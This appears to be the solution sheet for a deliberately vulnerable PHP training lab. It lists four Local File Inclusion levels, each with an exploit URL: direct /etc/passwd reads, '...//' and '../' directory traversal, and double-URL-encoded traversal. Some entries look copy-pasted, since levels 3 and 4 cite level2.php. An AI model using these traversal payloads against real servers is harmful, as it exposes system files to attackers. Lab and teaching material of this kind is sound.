## Level 1

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level1.php?file=/etc/passwd`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. 

## Level 2

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level2.php?file=...//index`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. The string replacement here is unsufficient because you can still change directories.

## Level 3

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level2.php?file=../../../etc/passwd`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. We can still change directories.


## Level 4

**Vulnerability:** Local File Inclusion

**Exploit:** `/Vulnerable_code/PHP/LFI/level2.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`

**Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. The urldecode() call is risky and should not be called with $\_GET or $\_REQUEST (see [PHP documentation](https://www.php.net/manual/fr/function.urldecode.php)).
